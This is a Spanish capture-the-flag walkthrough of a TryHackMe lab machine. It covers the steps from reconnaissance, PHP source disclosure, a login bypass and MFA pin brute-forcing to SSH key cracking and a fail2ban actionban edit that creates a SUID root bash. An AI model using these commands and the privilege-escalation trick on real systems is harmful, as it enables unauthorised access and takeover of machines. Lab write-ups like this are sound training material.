## TryHackMe  <> Biteme

![image](https://github.com/Esevka/CTF/assets/139042999/77c9b6a2-d31a-4c55-a2af-473a9c2aa32c)

Enlace Maquina: https://tryhackme.com/room/biteme

Enunciado : 
  - Start the machine and get the flags...

    
## Escaneo de puertos

- Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido por proximidad al valor 64 podriamos decir que es una maquina Linux.

      ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/biteme]
      └─# ping 10.10.81.190 -c1 
      PING 10.10.81.190 (10.10.81.190) 56(84) bytes of data.
      64 bytes from 10.10.81.190: icmp_seq=1 ttl=63 time=54.3 ms
      
      --- 10.10.81.190 ping statistics ---
      1 packets transmitted, 1 received, 0% packet loss, time 0ms
      rtt min/avg/max/mdev = 54.274/54.274/54.274/0.000 ms
  
- Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo).

      ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/nmap]
      └─# nmap -p- --open --min-rate 5000 -n -Pn 10.10.81.190 -oN open_ports                                                           
      Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 04:07 EDT
      PORT   STATE SERVICE
      22/tcp open  ssh
      80/tcp open  http
      
      ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/nmap]
      └─# nmap -p 22,80 -sCV 10.10.81.190 -oN info_ports
      Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 04:09 EDT
      Nmap scan report for 10.10.81.190
      Host is up (0.055s latency).
      
      PORT   STATE SERVICE VERSION
      22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 (RSA)
      |   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 (ECDSA)
      |_  256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc (ED25519)
      80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
      |_http-title: Apache2 Ubuntu Default Page: It works
      |_http-server-header: Apache/2.4.29 (Ubuntu)
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- Segun la version del servicio SSH que esta corriendo en el puerto 22.

  ![image](https://github.com/Esevka/CTF/assets/139042999/1029ca00-f307-487b-a84a-67da00f632f2)


## Analisis de vulnerabilidades en los servicios y explotacion de los mismos.

- Puerto 80,  nos carga lo siguiente y tras revisar el codigo no encontramos nada que nos pueda ayudar.

  ![image](https://github.com/Esevka/CTF/assets/139042999/cefd2d9c-d713-489e-a325-1572ef51d440)

    - Utilizamos Gobuster para fuzzear la web por fuerza bruta en busca de directorios ocultos, como vemos hemos encontrado varios directorios interesantes.
 
          ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/nmap]
          └─# gobuster dir -u http://10.10.81.190 -w /usr/share/wordlists/dirb/common.txt -o ../fuzz
          ===============================================================
          Gobuster v3.6
          by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
          ===============================================================
          /.hta                 (Status: 403) [Size: 277]
          /.htpasswd            (Status: 403) [Size: 277]
          /.htaccess            (Status: 403) [Size: 277]
          /console              (Status: 301) [Size: 314] [--> http://10.10.81.190/console/]
          /index.html           (Status: 200) [Size: 10918]
          /server-status        (Status: 403) [Size: 277]
          Progress: 4614 / 4615 (99.98%)
          ===============================================================

    - Cargamos el directorio  ---- /console ---- y encontramos un panel de login.

      ![image](https://github.com/Esevka/CTF/assets/139042999/b2a3edcd-2583-4934-beee-17fa842287cd)


    - Revisamos el codigo del panel y encontramos un javascript interesante, el cual utiliza una funcion un poco rara, eval(function(p,a,c,k,e,r) ,
      segun esta info de chatgpt el codigo se encuentra ofuscado
      
      ![image](https://github.com/Esevka/CTF/assets/139042999/d38a3128-0b18-4e52-9b27-e4b5fbad5dbb)
      
      
      ![image](https://github.com/Esevka/CTF/assets/139042999/9d77b141-4e16-43d8-9579-1a2ceec29500)

      Encontramos esta web que nos hace la funcion legible -- https://matthewfl.com/unPacker.html -- aunque no es necesario ya que el mensaje de la funcion se entiende que es lo mas importante.

          document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason

      Segun el mensaje cada vez que pulsemos el boton para loguearnos mostrara por la consola el siguiente mensaje
      
      ![image](https://github.com/Esevka/CTF/assets/139042999/a6df0ffd-aee5-4d8b-b5d4-6530a4fc7655)

    - Que es eso de -- php file syntax highlighting -- INFO: https://www.php.net/manual/en/function.highlight-file.php
      
      Por lo que segun esta info es posible que este servidor este configurado para remarcar automaticamente ficheros php  los cuales le establezcamos nosotros la extension.phps

          Imprime o devuelve una versión con la sintaxis remarcada del código contenido en el fichero dado por filename usando los colores
          definidos en el remarcador de sintaxis interno de PHP.

          Muchos servidores están configurados para remaracar automáticamente ficheros con la extensión phps. Por ejemplo, cuando se visione
          example.phps mostrará la fuente con la sintaxis remarcada del fichero.


    - Url que carga el panel de login

      ![image](https://github.com/Esevka/CTF/assets/139042999/b6882936-a9b3-47a8-9a8c-13b38d67d35a)

      Editamos la extension desde la url y bingo consegimos ver el codigo del panel de login.
      Como vemos el codigo php es muy simple comprueba que el usuario y la pass sean correctas(mediante las funciones is_valid_user,is_valid_pwd) en el caso de que se cumpla crea una cookie utilizando el         usuario y la pass y seguidamente nos redirecciona a mfa.php

      ![image](https://github.com/Esevka/CTF/assets/139042999/b70e79a7-f74c-445b-8f48-248ad6e1e83c)

      
      Vemos que el codigo php hace un include de -- functions.php -- por lo que vamos a intentar visualizar el codigo de la misma manera, utilizando la extension.phps

      ![image](https://github.com/Esevka/CTF/assets/139042999/f1bd9d06-f45d-4ac1-987b-928d2d6f581d)

        - function is_valid_user
     
              function is_valid_user($user){ --> Se le pasa como parametro el usuario introducido
      
              $user = bin2hex($user); --> Mediante la funcion bin2hex(Devuelve la representación hexadecimal de la cadena dada)
  
              return $user === LOGIN_USER;} --> Compara la variable $user(string hexadecimal) tanto en valor como tipo con la variable LOGIN_USER
                                                  Por lo que necesitamos saber el valor de LOGIN_USER.

            - functions.php continue un include --> include('config.php'), por lo que del mismo modo vamos a ver su contenido si es posible.
           
                  define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74'); --> valor de LOGIN_USER pasado por bin2hex, por lo que si conseguimos hacer
                                                                                    el proceso inverso tendremos usuario valido para el login.
              Proceso inverso para conseguir el nombre de usuario
              
                  ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/nmap]
                  └─# php -a
                  Interactive shell
                  
                  php > echo(hex2bin('6a61736f6e5f746573745f6163636f756e74'));
                  jason_test_account

        - function is_valid_pwd

              function is_valid_pwd($pwd){ --> Se le pasa como parametro la pass introducida
          
              $hash = md5($pwd); --> Calcula el hash md5 de la pass

              return substr($hash, -3) === '001';} --> Obtiene los tres ultimos digitos del hash md5 y los comparata tanto en valor como tipo con el string '001'
                                                        
          Por lo que necesitamos una pass que al calcularle su hash md5 los 3 ultimos digitos sea un string con el valor '001', para automatizar el proceso vamos a realizar un script en python y utilizar como diccionario de claves rockyou.txt

          ![image](https://github.com/Esevka/CTF/assets/139042999/f72bfe58-cd29-4d27-83ee-7b9f32813107)
     
          Obtenemos pass valida para el login
          
              ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/script]
              └─# python3 md5.py      
              violet:d1d813a48d99f0e102f7d0a1b9068001

  Por lo que llegados a este punto tendremos unas credenciales validas para el login
  
      jason_test_account:violet

  - Nos logueamos y nos redirige a mfa.php
 
    ![image](https://github.com/Esevka/CTF/assets/139042999/10990ac8-b789-4acd-9fe3-e2ba0cf48191)

    Supuestamente un codigo de 4 digitos ha sido enviado a un dispositivo el cual necesitamos para completar el login de dicho usuario.
    Analizamos el codigo de este form y volvemos a encontrar una funcion javascript ofuscada.

    ![image](https://github.com/Esevka/CTF/assets/139042999/5a3411f1-9079-491e-8329-aaf8812d2bba)

    El mensaje que entrega en la consola del navegador cada vez enviamos un pin es bastante claro, podriamos intentar algo de fuerza bruta.
    
    ![image](https://github.com/Esevka/CTF/assets/139042999/29a195df-25ec-4903-9084-29b52f883328)

        NOTA: mfa.php no lo podemos visualizar cambiando a la extension.phps

      - Ataque de fuerza bruta contra mfa.php

        1)Necesitamos un diccionario con todas las conbinaciones posibles con 4 digitos.

               ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/script]
               └─# crunch 4 4 -t %%%% > pin.txt
                Crunch will now generate the following number of lines: 10000

        2)Interceptamos la conexion para ver como envia los datos y obtener la cookie de la solicitud, vemos que si el pin no es correcto el servidor nos lo hace saber.

        ![image](https://github.com/Esevka/CTF/assets/139042999/f38a3adc-8165-440f-a353-05a510f23fb7)
        
        ![image](https://github.com/Esevka/CTF/assets/139042999/088809af-350b-4ad5-99a6-2d9e39478c92)

        3)Tenemos todo lo necesario para realizar nuestro script en python para automatizar el ataque y conseguir un pin valido.
        
        ![image](https://github.com/Esevka/CTF/assets/139042999/10d1e91a-11f6-4402-b16b-3e654fe5d5d7)

            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/script]
            └─# python3 mfa_brute.py
            [+]Pin valido ----> 1414

        4)Una vez introducimos el pin valido(el pin es aleatorio va cambiando), obtenemos acceso al panel de usuario.


## Obtenemos acceso a la maquina.

-El panel de usuario nos muestra dos form.

  - File browser (utiliza la funcion scandir() de php para mostrarnos el contenido del directorio que le indiquemos)

    ![image](https://github.com/Esevka/CTF/assets/139042999/bf3baef3-9636-4d21-8c7c-f034db0c3dd5)

  - File viewer (utiliza la funcion file_get_contents() de php para mostrarnos el contenido del fichero que le indiquemos)

    ![image](https://github.com/Esevka/CTF/assets/139042999/c8548731-b40a-43e3-a370-facd0b2be54c)


-Analizando directorios, encontramos una id_rsa del usuario jason

![image](https://github.com/Esevka/CTF/assets/139042999/f350acf2-6b69-4262-950d-e337dc9d01eb)

  - Mostramos la id_rsa y nos la copiamos a nuestro equipo para intentar conectarnos por ssh como usuario jason

    ![image](https://github.com/Esevka/CTF/assets/139042999/94b5f2ce-34af-4f40-aa0b-23e5b53550b7)

        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/content]
        └─# echo '-----BEGIN RSA PRIVATE KEY-----
        Proc-Type: 4,ENCRYPTED
        DEK-Info: AES-128-CBC,983BDF3BE962B7E88A5193CD1551E9B9
        
        nspZgFs2AHTCqQUdGbA0reuNel2jMB/3yaTZvAnqYt82m6Kb2ViAqlFtrvxJUTkx
        [...]
        xibeJfxvGyw0mp2eGebQDM5XiLhB0jI4wtVlvkUpd+smws03mbmYfT4ghwCyM1ru
        VpKcbfvlpUuMb4AH1KN0ifFJ0q3Te560LYc7QC44Y1g41ZmHigU7YOsweBieWkY2
        -----END RSA PRIVATE KEY-----' > id_rsa 
                                                                                                                                                            
        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/content]
        └─# chmod 400 id_rsa 

      Nos intentamos conectar con la id_rsa pero nos pide la clave de esta

        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/content]
        └─# ssh jason@10.10.191.13 -i id_rsa
        The authenticity of host '10.10.191.13 (10.10.191.13)' can't be established.
        ED25519 key fingerprint is SHA256:3NvL4FLmtivo46j76+yqa43LcYEB79JAUuXUAYQe/zI.
        Enter passphrase for key 'id_rsa':

      Vamos a intentar crakear la id_rsa para conseguir la clave

        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/content]
        └─# ssh2john id_rsa > john_idrsa  

        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/content]
        └─# john john_idrsa --wordlist=/usr/share/wordlists/rockyou.txt
        Using default input encoding: UTF-8
        Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
        No password hashes left to crack (see FAQ)
                                                                                                                                                            
        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/content]
        └─# john john_idrsa --show                                     
        id_rsa:1a2b3c4d --------------------------> clave obtenida.
        
        1 password hash cracked, 0 left

-Nos conectamos por ssh utilizando la id_rsa y la pass obtenida

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/biteme/content]
    └─# ssh jason@10.10.191.13 -i id_rsa                           
    Enter passphrase for key 'id_rsa': 
    Last login: Fri Mar  4 18:22:12 2022 from 10.0.2.2
    jason@biteme:~$ 


## Postexplotacion, obtencion de flags y elevacion de privilegios.

-Obtenemos la flag de usuario

    jason@biteme:~$ cat user.txt 
    THM{6fbf1.....abba70c33070}


-Listamos los permisos que tenemos sobre los comandos que podemos ejecutar con privilegios elevados en el sistema.

  Como vemos podemos ejecutar comandos sin necesidad de clave como el usuario fred

    jason@biteme:~$ sudo -l
    Matching Defaults entries for jason on biteme:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User jason may run the following commands on biteme:
        (ALL : ALL) ALL
        (fred) NOPASSWD: ALL


-Escalamos hozintalmente hacia el usuario fred, listamos los permisos que tenemos sobre los comandos que podemos ejecutar con privilegios elevados en el sistema.

    jason@biteme:~$ sudo -u fred /bin/bash

    
    fred@biteme:~$ sudo -l
    Matching Defaults entries for fred on biteme:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User fred may run the following commands on biteme:
        (root) NOPASSWD: /bin/systemctl restart fail2ban


-Como vemos tenemos permisos elevados para reiniciar el servicio fail2ban

    Que es Fail2ban es una aplicación escrita en Python para la prevención de intrusos en un sistema, que actúa 
    penalizando o bloqueando las conexiones remotas que intentan accesos por fuerza bruta. Se distribuye bajo 
    licencia GNU y típicamente funciona en sistemas POSIX que tengan interfaz con un sistema de control de paquetes
    o un firewall local (como iptables o TCP Wrapper)

-Elevamos privilegios root mediante el reinicio del servicio.

INFO Elevacion de privilegios mediante fail2ban --> https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7

  1)Editamos el apartado actionban del fichero fred@biteme:/etc/fail2ban/action.d/iptables-multiport.conf 

  Este apartado lo que hace es ejecutar el comando que le indiquemos a actionban cuando una ip es baneada, con los privilegios del usuario que ejecuta el servicio en este caso root.

    # Option:  actionban
    # Notes.:  command executed when banning an IP. Take care that the
    #          command is executed with Fail2Ban user rights.
    # Tags:    See jail.conf(5) man page
    # Values:  CMD
    #
    #actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
    actionban = cp /bin/bash /tmp/esevka && chmod 4777 /tmp/esevka     ----> copiamos una bash a /tmp/esevka y le activamos el SUID y le damos maximos permisos.

  2)Reiniciamos el servicio para que nuestros cambios se guarden.
  
    fred@biteme:~$ sudo /bin/systemctl restart fail2ban

  3)Para ejecutar nuestro codigo lo que tenemos que hacer es lo siguiente:
  
    - Mantener nuestra sesion ssh abierta 
    
    - Desde otra ventana de consola intentar conectar varias veces  por ssh introduciendo mal la pass.
      Tras varios intentos nos banearan la ip, ejecutando el codigo que hemos introducido en actionban.

  2)Como vemos tras ser baneado vemos que nos crea nuestra bash con el SUID activado.

    fred@biteme:~$ ls -la /tmp
    total 1128
    drwxrwxrwt 10 root root    4096 Sep 12 11:17 .
    drwxr-xr-x 24 root root    4096 Mar  4  2022 ..
    -rwsrwxrwx  1 root root 1113504 Sep 12 11:17 esevka

  3)Elevamos privilegios y obtenemos la flag

    fred@biteme:~$ /tmp/esevka -p
    
    esevka-4.4# whoami
    root
    
    esevka-4.4# cat /root/root.txt 
    THM{0e35.....41cc6678d}



---> Maquina  Biteme completa <---
---



    


    


  

  










        




  
    

          
                  



      
 
      






